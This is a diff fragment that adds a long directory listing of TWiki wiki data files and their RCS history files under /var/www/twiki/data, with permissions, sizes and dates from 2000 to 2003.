+    -rwxrwxrwx 1 www-data www-data 302 2000-08-18 21:18 /var/www/twiki/data/Know/NoDisclosure.txt
+    -rwxrwxrwx 1 www-data www-data 291 2000-08-18 21:18 /var/www/twiki/data/Know/PublicSupported.txt
+    -rwxrwxrwx 1 www-data www-data 1402 2001-09-18 02:39 /var/www/twiki/data/Know/WebForm.txt,v
+    -rwxrwxrwx 1 www-data www-data 483 2001-11-24 06:38 /var/www/twiki/data/Know/WebIndex.txt,v
+    -rwxrwxrwx 1 www-data www-data 592 2000-08-18 21:15 /var/www/twiki/data/Know/OsWin.txt,v
+    -rwxrwxrwx 1 www-data www-data 3471 2003-01-19 16:37 /var/www/twiki/data/Know/WebPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 689 2000-08-18 21:18 /var/www/twiki/data/Know/NoDisclosure.txt,v
+    -rwxrwxrwx 1 www-data www-data 6651 2002-04-14 02:20 /var/www/twiki/data/Know/WebHome.txt,v
+    -rwxrwxrwx 1 www-data www-data 527 2001-09-04 03:14 /var/www/twiki/data/Know/OsVersion.txt,v
+    -rwxrwxrwx 1 www-data www-data 13 2000-04-05 19:03 /var/www/twiki/data/Know/SunOS.txt
+    -rwxrwxrwx 1 www-data www-data 371 2001-11-24 06:38 /var/www/twiki/data/Know/WebTopicList.txt,v
+    -rwxrwxrwx 1 www-data www-data 1240 2001-09-04 03:13 /var/www/twiki/data/Know/OperatingSystem.txt,v
+    -rwxrwxrwx 1 www-data www-data 257 2000-08-18 21:17 /var/www/twiki/data/Know/OsSolaris.txt
+    -rwxrwxrwx 1 www-data www-data 255 2000-08-18 21:16 /var/www/twiki/data/Know/OsHPUX.txt
+    -rwxrwxrwx 1 www-data www-data 589 2000-08-18 21:16 /var/www/twiki/data/Know/OsHPUX.txt,v
+    -rwxrwxrwx 1 www-data www-data 21460 2001-09-04 03:20 /var/www/twiki/data/Know/WebSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 253 2000-08-18 21:16 /var/www/twiki/data/Know/OsMacOS.txt
+    -rwxrwxrwx 1 www-data www-data 831 2003-01-19 03:49 /var/www/twiki/data/Know/WebStatistics.txt
+    -rwxrwxrwx 1 www-data www-data 7834 2003-01-19 16:37 /var/www/twiki/data/Know/WebPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 590 2000-08-18 21:17 /var/www/twiki/data/Know/OsSunOS.txt,v
+    -rwxrwxrwx 1 www-data www-data 3489 2003-01-30 03:15 /var/www/twiki/data/Know/.changes
+    -rwxrwxrwx 1 www-data www-data 176 2001-11-24 06:38 /var/www/twiki/data/Know/WebIndex.txt
+    -rwxrwxrwx 1 www-data www-data 1934 2003-01-19 03:49 /var/www/twiki/data/Know/WebStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 256 2000-08-18 21:17 /var/www/twiki/data/Know/OsSunOS.txt
+    -rwxrwxrwx 1 www-data www-data 13760 2003-02-01 20:20 /var/www/twiki/data/TWiki/TWikiPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 409 2003-01-30 03:12 /var/www/twiki/data/TWiki/WebRss.txt
+    -rwxrwxrwx 1 www-data www-data 2836 2003-01-30 03:11 /var/www/twiki/data/TWiki/WebRssBase.txt,v
+    -rwxrwxrwx 1 www-data www-data 1666 2003-01-23 03:34 /var/www/twiki/data/TWiki/TWikiEnhancementRequests.txt,v
+    -rwxrwxrwx 1 www-data www-data 8199 2003-01-08 23:59 /var/www/twiki/data/TWiki/TextFormattingFAQ.txt
+    -rwxrwxrwx 1 www-data www-data 1055 2003-01-31 01:40 /var/www/twiki/data/TWiki/TextEditor.txt,v
+    -rwxrwxrwx 1 www-data www-data 2294 2003-01-31 01:50 /var/www/twiki/data/TWiki/AdminSkillsAssumptions.txt
+    -rwxrwxrwx 1 www-data www-data 1116 2001-11-20 21:02 /var/www/twiki/data/TWiki/WebTopicEditTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 1115 2002-03-17 04:14 /var/www/twiki/data/TWiki/FileAttribute.txt,v
+    -rwxrwxrwx 1 www-data www-data 369 2001-11-13 17:02 /var/www/twiki/data/TWiki/HiddenAttachment.txt
+    -rwxrwxrwx 1 www-data www-data 38474 2003-02-01 20:20 /var/www/twiki/data/TWiki/TWikiPreferences.txt,v
+    -rwxrwxrwx 1 www-data www-data 1109 2002-06-11 23:31 /var/www/twiki/data/TWiki/UnlockTopic.txt
+    -rwxrwxrwx 1 www-data www-data 3663 2002-05-12 15:04 /var/www/twiki/data/TWiki/TWikiSite.txt
+    -rwxrwxrwx 1 www-data www-data 15999 2003-02-01 05:01 /var/www/twiki/data/TWiki/WikiSyntax.txt,v
+    -rwxrwxrwx 1 www-data www-data 440 2002-03-17 04:14 /var/www/twiki/data/TWiki/FileAttribute.txt
+    -rwxrwxrwx 1 www-data www-data 1058 2001-08-16 15:59 /var/www/twiki/data/TWiki/WebChanges.txt
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-22 04:25 /var/www/twiki/data/TWiki/AdrianLynch.txt
+    -rwxrwxrwx 1 www-data www-data 860 2003-01-11 21:54 /var/www/twiki/data/TWiki/AndreaSterbini.txt,v
+    -rwxrwxrwx 1 www-data www-data 524 2003-01-11 21:39 /var/www/twiki/data/TWiki/StanleyKnutson.txt,v
+    -rwxrwxrwx 1 www-data www-data 664 2001-09-12 02:34 /var/www/twiki/data/TWiki/ExampleTopicTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 1495 2003-01-08 02:23 /var/www/twiki/data/TWiki/WebTopicViewTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 1693 2002-05-12 02:35 /var/www/twiki/data/TWiki/WikiTopic.txt,v
+    -rwxrwxrwx 1 www-data www-data 7126 2002-04-21 02:03 /var/www/twiki/data/TWiki/InterWikis.txt,v
+    -rwxrwxrwx 1 www-data www-data 2475 2001-12-02 02:59 /var/www/twiki/data/TWiki/GoodStyle.txt
+    -rwxrwxrwx 1 www-data www-data 9 2001-10-25 11:51 /var/www/twiki/data/TWiki/.mailnotify
+    -rwxrwxrwx 1 www-data www-data 592 2003-01-11 21:37 /var/www/twiki/data/TWiki/RyanFreebern.txt,v
+    -rwxrwxrwx 1 www-data www-data 17214 2002-12-11 02:32 /var/www/twiki/data/TWiki/TWikiMetaData.txt,v
+    -rwxrwxrwx 1 www-data www-data 197 2003-01-11 21:54 /var/www/twiki/data/TWiki/AndreaSterbini.txt
+    -rwxrwxrwx 1 www-data www-data 991 2001-08-31 20:22 /var/www/twiki/data/TWiki/SimultaneousEdits.txt,v
+    -rwxrwxrwx 1 www-data www-data 10435 2003-02-01 06:46 /var/www/twiki/data/TWiki/TWikiTopics.txt
+    -rwxrwxrwx 1 www-data www-data 69 2000-07-01 01:12 /var/www/twiki/data/TWiki/WikiNotation.txt
+    -rwxrwxrwx 1 www-data www-data 224 2001-10-24 22:07 /var/www/twiki/data/TWiki/TWikiFaqTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 729 2001-07-13 19:56 /var/www/twiki/data/TWiki/DontNotify.txt
+    -rwxrwxrwx 1 www-data www-data 2645 2003-01-30 03:11 /var/www/twiki/data/TWiki/WebRssBase.txt
+    -rwxrwxrwx 1 www-data www-data 5101 2003-01-19 03:32 /var/www/twiki/data/TWiki/ManagingWebs.txt
+    -rwxrwxrwx 1 www-data www-data 1472 2002-01-11 02:59 /var/www/twiki/data/TWiki/MetaDataRendering.txt
+    -rwxrwxrwx 1 www-data www-data 502 2003-01-18 04:46 /var/www/twiki/data/TWiki/WhatIsWikiWiki.txt
+    -rwxrwxrwx 1 www-data www-data 621 2001-08-31 20:22 /var/www/twiki/data/TWiki/SimultaneousEdits.txt
+    -rwxrwxrwx 1 www-data www-data 11927 2002-05-04 11:32 /var/www/twiki/data/TWiki/FileAttachment.txt
+    -rwxrwxrwx 1 www-data www-data 2340 2001-11-10 00:59 /var/www/twiki/data/TWiki/DeleteOrRenameATopic.txt,v
+    -rwxrwxrwx 1 www-data www-data 25118 2003-01-12 04:14 /var/www/twiki/data/TWiki/ManagingTopics.txt,v
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-11 19:47 /var/www/twiki/data/TWiki/CrisBailiff.txt
+    -rwxrwxrwx 1 www-data www-data 4229 2002-04-10 00:59 /var/www/twiki/data/TWiki/WikiCulture.txt,v
+    -rwxrwxrwx 1 www-data www-data 3150 2002-08-03 22:58 /var/www/twiki/data/TWiki/MainFeatures.txt,v
+    -rwxrwxrwx 1 www-data www-data 125234 2003-02-01 20:57 /var/www/twiki/data/TWiki/TWikiHistory.txt,v
+    -rwxrwxrwx 1 www-data www-data 649 2001-10-24 22:07 /var/www/twiki/data/TWiki/TWikiFaqTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-25 01:42 /var/www/twiki/data/TWiki/MartinRaabe.txt
+    -rwxrwxrwx 1 www-data www-data 40856 2003-01-25 04:23 /var/www/twiki/data/TWiki/TWikiForms.txt,v
+    -rwxrwxrwx 1 www-data www-data 7394 2003-01-30 02:43 /var/www/twiki/data/TWiki/TWikiSiteTools.txt
+    -rwxrwxrwx 1 www-data www-data 22832 2003-01-27 03:22 /var/www/twiki/data/TWiki/TWikiVariables.txt
+    -rwxrwxrwx 1 www-data www-data 4489 2003-01-18 04:22 /var/www/twiki/data/TWiki/WikiWord.txt,v
+    -rwxrwxrwx 1 www-data www-data 160 2003-01-11 21:33 /var/www/twiki/data/TWiki/RandyKramer.txt
+    -rwxrwxrwx 1 www-data www-data 994 2003-01-12 02:19 /var/www/twiki/data/TWiki/InstallPassword.txt
+    -rwxrwxrwx 1 www-data www-data 6750 2003-02-01 15:46 /var/www/twiki/data/TWiki/TWikiAdminCookBook.txt,v
+    -rwxrwxrwx 1 www-data www-data 1547 2003-01-11 19:47 /var/www/twiki/data/TWiki/DavidWarman.txt,v
+    -rwxrwxrwx 1 www-data www-data 15435 2003-01-30 03:56 /var/www/twiki/data/TWiki/TWikiRegistrationPub.txt,v
+    -rwxrwxrwx 1 www-data www-data 17794 2003-02-01 15:47 /var/www/twiki/data/TWiki/TextFormattingRules.txt
+    -rwxrwxrwx 1 www-data www-data 9640 2003-02-01 19:33 /var/www/twiki/data/TWiki/TWikiUpgradeGuide.txt
+    -rwxrwxrwx 1 www-data www-data 18929 2003-02-01 20:02 /var/www/twiki/data/TWiki/TWikiFuncModule.txt
+    -rwxrwxrwx 1 www-data www-data 2078 2003-01-18 04:42 /var/www/twiki/data/TWiki/WikiName.txt,v
+    -rwxrwxrwx 1 www-data www-data 3055 2003-02-01 07:26 /var/www/twiki/data/TWiki/IncludeTopicsAndWebPages.txt
+    -rwxrwxrwx 1 www-data www-data 724 2003-01-23 03:08 /var/www/twiki/data/TWiki/WebChangesAlert.txt
+    -rwxrwxrwx 1 www-data www-data 5751 2003-01-27 04:14 /var/www/twiki/data/TWiki/TWikiGlossary.txt,v
+    -rwxrwxrwx 1 www-data www-data 8327 2001-12-02 02:59 /var/www/twiki/data/TWiki/GoodStyle.txt,v
+    -rwxrwxrwx 1 www-data www-data 6824 2002-12-11 02:32 /var/www/twiki/data/TWiki/TWikiMetaData.txt
+    -rwxrwxrwx 1 www-data www-data 8086 2001-09-01 03:33 /var/www/twiki/data/TWiki/TWikiUpgradeTo01Dec2000.txt
+    -rwxrwxrwx 1 www-data www-data 275 2002-04-12 15:44 /var/www/twiki/data/TWiki/TWikiWebsTable.txt
+    -rwxrwxrwx 1 www-data www-data 4709 2003-02-01 05:09 /var/www/twiki/data/TWiki/WebHome.txt
+    -rwxrwxrwx 1 www-data www-data 9005 2003-01-25 04:23 /var/www/twiki/data/TWiki/TWikiForms.txt
+    -rwxrwxrwx 1 www-data www-data 2203 2002-02-11 14:16 /var/www/twiki/data/TWiki/WikiReferences.txt
+    -rwxrwxrwx 1 www-data www-data 1241 2003-01-19 03:30 /var/www/twiki/data/TWiki/TemplateWeb.txt
+    -rwxrwxrwx 1 www-data www-data 2013 2001-09-01 03:27 /var/www/twiki/data/TWiki/SiteUsageStatistics.txt,v
+    -rwxrwxrwx 1 www-data www-data 2818 2002-06-28 04:10 /var/www/twiki/data/TWiki/TWikiLogos.txt,v
+    -rwxrwxrwx 1 www-data www-data 3603 2001-09-01 03:20 /var/www/twiki/data/TWiki/TWikiUpgradeTo01May2000.txt,v
+    -rwxrwxrwx 1 www-data www-data 194 2003-01-11 21:25 /var/www/twiki/data/TWiki/NicholasLee.txt
+    -rwxrwxrwx 1 www-data www-data 1296 2001-07-13 19:56 /var/www/twiki/data/TWiki/DontNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 4838 2003-01-18 04:52 /var/www/twiki/data/TWiki/WelcomeGuest.txt
+    -rwxrwxrwx 1 www-data www-data 924 2003-01-25 05:25 /var/www/twiki/data/TWiki/WebNotify.txt
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-27 02:42 /var/www/twiki/data/TWiki/GrantBow.txt
+    -rwxrwxrwx 1 www-data www-data 3592 2003-01-08 02:22 /var/www/twiki/data/TWiki/WebTopicNonWikiTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 21284 2003-02-01 20:02 /var/www/twiki/data/TWiki/TWikiFuncModule.txt,v
+    -rwxrwxrwx 1 www-data www-data 34095 2003-02-01 06:46 /var/www/twiki/data/TWiki/TWikiTopics.txt,v
+    -rwxrwxrwx 1 www-data www-data 35836 2002-12-09 15:08 /var/www/twiki/data/TWiki/StandardColors.txt,v
+    -rwxrwxrwx 1 www-data www-data 6748 2003-01-12 04:14 /var/www/twiki/data/TWiki/ManagingTopics.txt
+    -rwxrwxrwx 1 www-data www-data 6842 2003-01-23 03:08 /var/www/twiki/data/TWiki/WebChangesAlert.txt,v
+    -rwxrwxrwx 1 www-data www-data 701 2003-01-11 19:47 /var/www/twiki/data/TWiki/AlWilliams.txt,v
+    -rwxrwxrwx 1 www-data www-data 3052 2003-01-27 04:14 /var/www/twiki/data/TWiki/TWikiGlossary.txt
+    -rwxrwxrwx 1 www-data www-data 182 2001-11-24 06:32 /var/www/twiki/data/TWiki/WebTopicList.txt
+    -rwxrwxrwx 1 www-data www-data 12667 2003-02-01 08:00 /var/www/twiki/data/TWiki/TWikiTemplates.txt
+    -rwxrwxrwx 1 www-data www-data 900 2003-01-11 19:47 /var/www/twiki/data/TWiki/CrisBailiff.txt,v
+    -rwxrwxrwx 1 www-data www-data 4772 2003-01-08 02:14 /var/www/twiki/data/TWiki/TWikiSkins.txt
+    -rwxrwxrwx 1 www-data www-data 194 2001-09-01 03:38 /var/www/twiki/data/TWiki/MoveTopic.txt
+    -rwxrwxrwx 1 www-data www-data 1355 2001-08-31 20:20 /var/www/twiki/data/TWiki/GnuGeneralPublicLicense.txt
+    -rwxrwxrwx 1 www-data www-data 11600 2003-01-30 02:43 /var/www/twiki/data/TWiki/TWikiSiteTools.txt,v
+    -rwxrwxrwx 1 www-data www-data 556 2001-08-31 20:19 /var/www/twiki/data/TWiki/EditDoesNotIncreaseTheRevision.txt
+    -rwxrwxrwx 1 www-data www-data 2847 2002-01-11 02:59 /var/www/twiki/data/TWiki/MetaDataRendering.txt,v
+    -rwxrwxrwx 1 www-data www-data 4383 2002-05-12 08:10 /var/www/twiki/data/TWiki/WabiSabi.txt,v
+    -rwxrwxrwx 1 www-data www-data 1504 2003-01-19 03:43 /var/www/twiki/data/TWiki/YouAreHere.txt,v
+    -rwxrwxrwx 1 www-data www-data 461 2003-01-23 03:41 /var/www/twiki/data/TWiki/TWikiPlannedFeatures.txt
+    -rwxrwxrwx 1 www-data www-data 598 2003-01-30 03:12 /var/www/twiki/data/TWiki/WebRss.txt,v
+    -rwxrwxrwx 1 www-data www-data 161 2003-01-11 21:40 /var/www/twiki/data/TWiki/VitoMiliano.txt
+    -rwxrwxrwx 1 www-data www-data 793 2002-06-05 03:34 /var/www/twiki/data/TWiki/NewUserTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 1719 2003-01-23 03:36 /var/www/twiki/data/TWiki/TWikiFAQ.txt
+    -rwxrwxrwx 1 www-data www-data 609 2003-01-11 21:25 /var/www/twiki/data/TWiki/MikeMannix.txt,v
+    -rwxrwxrwx 1 www-data www-data 592 2003-01-11 19:46 /var/www/twiki/data/TWiki/ColasNahaboo.txt,v
+    -rwxrwxrwx 1 www-data www-data 184 2003-01-11 21:22 /var/www/twiki/data/TWiki/JohnTalintyre.txt
+    -rwxrwxrwx 1 www-data www-data 4208 2003-01-30 03:48 /var/www/twiki/data/TWiki/TWikiRegistration.txt
+    -rwxrwxrwx 1 www-data www-data 739 2001-09-01 03:38 /var/www/twiki/data/TWiki/MoveTopic.txt,v
+    -rwxrwxrwx 1 www-data www-data 206 2003-01-11 21:24 /var/www/twiki/data/TWiki/KevinKinnell.txt
+    -rwxrwxrwx 1 www-data www-data 1224 2002-11-07 02:54 /var/www/twiki/data/TWiki/ResetPassword.txt
+    -rwxrwxrwx 1 www-data www-data 3400 2003-01-08 02:23 /var/www/twiki/data/TWiki/WebTopicViewTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 1827 2002-05-12 08:10 /var/www/twiki/data/TWiki/WabiSabi.txt
+    -rwxrwxrwx 1 www-data www-data 1541 2002-06-05 03:34 /var/www/twiki/data/TWiki/NewUserTemplate.txt,v
+    -rwxrwxrwx 1 www-data www-data 118 2001-11-20 21:02 /var/www/twiki/data/TWiki/WebTopicEditTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 27633 2003-01-18 04:52 /var/www/twiki/data/TWiki/WelcomeGuest.txt,v
+    -rwxrwxrwx 1 www-data www-data 46674 2003-01-30 03:41 /var/www/twiki/data/TWiki/TWikiPlugins.txt,v
+    -rwxrwxrwx 1 www-data www-data 2468 2003-02-01 05:06 /var/www/twiki/data/TWiki/StartingPoints.txt,v
+    -rwxrwxrwx 1 www-data www-data 5755 2002-06-13 02:03 /var/www/twiki/data/TWiki/EmptyPlugin.txt,v
+    -rwxrwxrwx 1 www-data www-data 234 2001-11-30 05:26 /var/www/twiki/data/TWiki/TablePlugin.txt
+    -rwxrwxrwx 1 www-data www-data 11402 2002-11-23 00:52 /var/www/twiki/data/TWiki/RegularExpression.txt,v
+    -rwxrwxrwx 1 www-data www-data 64892 2003-02-01 20:26 /var/www/twiki/data/TWiki/TWikiSystemRequirements.txt,v
+    -rwxrwxrwx 1 www-data www-data 371 2001-08-31 21:32 /var/www/twiki/data/TWiki/TWikiDownload.txt
+    -rwxrwxrwx 1 www-data www-data 1725 2001-08-31 20:20 /var/www/twiki/data/TWiki/GnuGeneralPublicLicense.txt,v
+    -rwxrwxrwx 1 www-data www-data 19029 2001-09-01 03:33 /var/www/twiki/data/TWiki/TWikiUpgradeTo01Dec2000.txt,v
+    -rwxrwxrwx 1 www-data www-data 353 2002-10-23 01:27 /var/www/twiki/data/TWiki/BookView.txt
+    -rwxrwxrwx 1 www-data www-data 162 2003-01-11 21:37 /var/www/twiki/data/TWiki/RyanFreebern.txt
+    -rwxrwxrwx 1 www-data www-data 22309 2003-02-01 20:42 /var/www/twiki/data/TWiki/AppendixFileSystem.txt
+    -rwxrwxrwx 1 www-data www-data 399 2003-01-23 03:34 /var/www/twiki/data/TWiki/TWikiEnhancementRequests.txt
+    -rwxrwxrwx 1 www-data www-data 43618 2003-02-01 20:36 /var/www/twiki/data/TWiki/WindowsInstallCookbook.txt,v
+    -rwxrwxrwx 1 www-data www-data 34961 2003-02-01 08:00 /var/www/twiki/data/TWiki/TWikiTemplates.txt,v
+    -rwxrwxrwx 1 www-data www-data 164 2003-01-11 21:39 /var/www/twiki/data/TWiki/StanleyKnutson.txt
+    -rwxrwxrwx 1 www-data www-data 254 2003-01-11 21:43 /var/www/twiki/data/TWiki/PeterThoeny.txt
+    -rwxrwxrwx 1 www-data www-data 1086 2003-01-11 21:43 /var/www/twiki/data/TWiki/PeterThoeny.txt,v
+    -rwxrwxrwx 1 www-data www-data 6483 2003-02-01 07:26 /var/www/twiki/data/TWiki/IncludeTopicsAndWebPages.txt,v
+    -rwxrwxrwx 1 www-data www-data 109 2003-02-01 05:03 /var/www/twiki/data/TWiki/TWikiShorthand.txt
+    -rwxrwxrwx 1 www-data www-data 7141 2002-08-13 12:46 /var/www/twiki/data/TWiki/FormattedSearch.txt
+    -rwxrwxrwx 1 www-data www-data 1239 2003-01-17 01:20 /var/www/twiki/data/TWiki/ChangePassword.txt
+    -rwxrwxrwx 1 www-data www-data 5023 2003-01-25 02:09 /var/www/twiki/data/TWiki/TWikiDocGraphics.txt
+    -rwxrwxrwx 1 www-data www-data 2629 2002-06-28 04:10 /var/www/twiki/data/TWiki/TWikiLogos.txt
+    -rwxrwxrwx 1 www-data www-data 1057 2001-08-31 20:21 /var/www/twiki/data/TWiki/SearchDoesNotWork.txt,v
+    -rwxrwxrwx 1 www-data www-data 256 2003-01-18 04:57 /var/www/twiki/data/TWiki/TimBernersLee.txt
+    -rwxrwxrwx 1 www-data www-data 3023 2003-02-01 20:26 /var/www/twiki/data/TWiki/TWikiSystemRequirements.txt
+    -rwxrwxrwx 1 www-data www-data 446 2003-01-23 03:23 /var/www/twiki/data/TWiki/WikiWikiClones.txt
+    -rwxrwxrwx 1 www-data www-data 2336 2003-01-08 02:17 /var/www/twiki/data/TWiki/WebSiteTools.txt,v
+    -rwxrwxrwx 1 www-data www-data 13266 2002-12-28 21:18 /var/www/twiki/data/TWiki/TWikiAccessControl.txt
+    -rwxrwxrwx 1 www-data www-data 1446 2003-01-11 21:26 /var/www/twiki/data/TWiki/PeterFokkinga.txt,v
+    -rwxrwxrwx 1 www-data www-data 1696 2001-08-16 15:59 /var/www/twiki/data/TWiki/WebChanges.txt,v
+    -rwxrwxrwx 1 www-data www-data 5875 2003-02-01 15:46 /var/www/twiki/data/TWiki/TWikiAdminCookBook.txt
+    -rwxrwxrwx 1 www-data www-data 1570 2003-01-11 21:23 /var/www/twiki/data/TWiki/ChristopheVermeulen.txt,v
+    -rwxrwxrwx 1 www-data www-data 162 2003-01-11 21:40 /var/www/twiki/data/TWiki/SvenDowideit.txt
+    -rwxrwxrwx 1 www-data www-data 1430 2003-01-19 03:30 /var/www/twiki/data/TWiki/TemplateWeb.txt,v
+    -rwxrwxrwx 1 www-data www-data 2031 2003-01-12 02:19 /var/www/twiki/data/TWiki/InstallPassword.txt,v
+    -rwxrwxrwx 1 www-data www-data 2828 2003-02-01 05:01 /var/www/twiki/data/TWiki/WikiSyntax.txt
+    -rwxrwxrwx 1 www-data www-data 15486 2003-01-30 03:41 /var/www/twiki/data/TWiki/TWikiPlugins.txt
+    -rwxrwxrwx 1 www-data www-data 42331 2003-02-01 20:36 /var/www/twiki/data/TWiki/WindowsInstallCookbook.txt
+    -rwxrwxrwx 1 www-data www-data 2785 2003-01-25 05:25 /var/www/twiki/data/TWiki/WebNotify.txt,v
+    -rwxrwxrwx 1 www-data www-data 587 2003-01-27 02:42 /var/www/twiki/data/TWiki/GrantBow.txt,v
+    -rwxrwxrwx 1 www-data www-data 6335 2003-01-19 04:01 /var/www/twiki/data/TWiki/WebSearch.txt
+    -rwxrwxrwx 1 www-data www-data 207 2003-01-11 19:50 /var/www/twiki/data/TWiki/KlausWriessnegger.txt
+    -rwxrwxrwx 1 www-data www-data 571 2003-01-29 03:16 /var/www/twiki/data/TWiki/GoBox.txt
+    -rwxrwxrwx 1 www-data www-data 1412 2003-01-23 02:55 /var/www/twiki/data/TWiki/PreviewBackground.txt
+    -rwxrwxrwx 1 www-data www-data 4875 2003-01-17 01:20 /var/www/twiki/data/TWiki/ChangePassword.txt,v
+    -rwxrwxrwx 1 www-data www-data 240 2001-09-12 02:34 /var/www/twiki/data/TWiki/ExampleTopicTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 162 2003-01-11 19:49 /var/www/twiki/data/TWiki/JohnAltstadt.txt
+    -rwxrwxrwx 1 www-data www-data 499 2001-08-31 20:21 /var/www/twiki/data/TWiki/SearchDoesNotWork.txt
+    -rwxrwxrwx 1 www-data www-data 2961 2002-08-03 22:58 /var/www/twiki/data/TWiki/MainFeatures.txt
+    -rwxrwxrwx 1 www-data www-data 35154 2002-05-04 11:32 /var/www/twiki/data/TWiki/FileAttachment.txt,v
+    -rwxrwxrwx 1 www-data www-data 1374 2003-02-01 05:06 /var/www/twiki/data/TWiki/StartingPoints.txt
+    -rwxrwxrwx 1 www-data www-data 165 2003-01-11 19:48 /var/www/twiki/data/TWiki/HaroldGottschalk.txt
+    -rwxrwxrwx 1 www-data www-data 169 2003-01-11 21:23 /var/www/twiki/data/TWiki/ChristopheVermeulen.txt
+    -rwxrwxrwx 1 www-data www-data 1429 2000-07-01 01:12 /var/www/twiki/data/TWiki/WikiNotation.txt,v
+    -rwxrwxrwx 1 www-data www-data 1712 2003-01-18 04:46 /var/www/twiki/data/TWiki/WhatIsWikiWiki.txt,v
+    -rwxrwxrwx 1 www-data www-data 4213 2002-04-21 02:03 /var/www/twiki/data/TWiki/InterWikis.txt
+    -rwxrwxrwx 1 www-data www-data 350 2003-01-25 01:42 /var/www/twiki/data/TWiki/MartinRaabe.txt,v
+    -rwxrwxrwx 1 www-data www-data 13827 2002-08-13 12:46 /var/www/twiki/data/TWiki/FormattedSearch.txt,v
+    -rwxrwxrwx 1 www-data www-data 8779 2003-01-30 03:56 /var/www/twiki/data/TWiki/TWikiRegistrationPub.txt
+    -rwxrwxrwx 1 www-data www-data 22166 2002-12-17 03:46 /var/www/twiki/data/TWiki/TWikiUpgradeTo01Dec2001.txt
+    -rwxrwxrwx 1 www-data www-data 3480 2003-01-31 01:50 /var/www/twiki/data/TWiki/AdminSkillsAssumptions.txt,v
+    -rwxrwxrwx 1 www-data www-data 12091 2003-01-25 02:09 /var/www/twiki/data/TWiki/TWikiDocGraphics.txt,v
+    -rwxrwxrwx 1 www-data www-data 55421 2002-12-28 21:18 /var/www/twiki/data/TWiki/TWikiAccessControl.txt,v
+    -rwxrwxrwx 1 www-data www-data 742 2003-01-18 04:57 /var/www/twiki/data/TWiki/TimBernersLee.txt,v
+    -rwxrwxrwx 1 www-data www-data 7880 2003-01-27 02:41 /var/www/twiki/data/TWiki/InterwikiPlugin.txt,v
+    -rwxrwxrwx 1 www-data www-data 593 2003-01-11 19:51 /var/www/twiki/data/TWiki/MartinCleaver.txt,v
+    -rwxrwxrwx 1 www-data www-data 760 2003-01-29 03:16 /var/www/twiki/data/TWiki/GoBox.txt,v
+    -rwxrwxrwx 1 www-data www-data 483 2001-11-24 06:31 /var/www/twiki/data/TWiki/WebIndex.txt,v
+    -rwxrwxrwx 1 www-data www-data 689 2003-01-11 21:36 /var/www/twiki/data/TWiki/RichardDonkin.txt,v
+    -rwxrwxrwx 1 www-data www-data 196 2003-01-11 21:36 /var/www/twiki/data/TWiki/RichardDonkin.txt
+    -rwxrwxrwx 1 www-data www-data 522 2002-05-12 02:46 /var/www/twiki/data/TWiki/InstalledPlugins.txt
+    -rwxrwxrwx 1 www-data www-data 712 2003-01-11 19:48 /var/www/twiki/data/TWiki/HaroldGottschalk.txt,v
+    -rwxrwxrwx 1 www-data www-data 7401 2002-10-22 02:42 /var/www/twiki/data/TWiki/TWikiTutorial.txt
+    -rwxrwxrwx 1 www-data www-data 183 2003-01-11 21:25 /var/www/twiki/data/TWiki/MikeMannix.txt
+    -rwxrwxrwx 1 www-data www-data 10181 2003-01-30 03:48 /var/www/twiki/data/TWiki/TWikiRegistration.txt,v
+    -rwxrwxrwx 1 www-data www-data 1108 2001-11-10 00:59 /var/www/twiki/data/TWiki/DeleteOrRenameATopic.txt
+    -rwxrwxrwx 1 www-data www-data 3894 2003-01-22 04:58 /var/www/twiki/data/TWiki/WebPreferences.txt
+    -rwxrwxrwx 1 www-data www-data 163 2003-01-11 19:50 /var/www/twiki/data/TWiki/ManpreetSingh.txt
+    -rwxrwxrwx 1 www-data www-data 2940 2002-06-11 23:31 /var/www/twiki/data/TWiki/UnlockTopic.txt,v
+    -rwxrwxrwx 1 www-data www-data 558 2001-11-13 17:02 /var/www/twiki/data/TWiki/HiddenAttachment.txt,v
+    -rwxrwxrwx 1 www-data www-data 2728 2003-01-18 04:22 /var/www/twiki/data/TWiki/WikiWord.txt
+    -rwxrwxrwx 1 www-data www-data 862 2003-01-11 19:48 /var/www/twiki/data/TWiki/TWikiContributor.txt
+    -rwxrwxrwx 1 www-data www-data 5634 2002-11-23 00:52 /var/www/twiki/data/TWiki/RegularExpression.txt
+    -rwxrwxrwx 1 www-data www-data 54240 2003-02-01 05:09 /var/www/twiki/data/TWiki/WebHome.txt,v
+    -rwxrwxrwx 1 www-data www-data 707 2003-01-11 19:50 /var/www/twiki/data/TWiki/ManpreetSingh.txt,v
+    -rwxrwxrwx 1 www-data www-data 13827 2003-02-01 19:33 /var/www/twiki/data/TWiki/TWikiUpgradeGuide.txt,v
+    -rwxrwxrwx 1 www-data www-data 1468 2003-01-08 02:22 /var/www/twiki/data/TWiki/WebTopicNonWikiTemplate.txt
+    -rwxrwxrwx 1 www-data www-data 3609 2003-01-27 02:41 /var/www/twiki/data/TWiki/InterwikiPlugin.txt
+    -rwxrwxrwx 1 www-data www-data 891 2003-01-19 03:43 /var/www/twiki/data/TWiki/YouAreHere.txt
+    -rwxrwxrwx 1 www-data www-data 1193 2002-04-21 02:18 /var/www/twiki/data/TWiki/SiteMap.txt
+    -rwxrwxrwx 1 www-data www-data 3925 2002-11-07 02:54 /var/www/twiki/data/TWiki/ResetPassword.txt,v
+    -rwxrwxrwx 1 www-data www-data 5331 2002-01-05 03:30 /var/www/twiki/data/TWiki/DefaultPlugin.txt,v
+    -rwxrwxrwx 1 www-data www-data 350 2003-01-22 04:25 /var/www/twiki/data/TWiki/AdrianLynch.txt,v
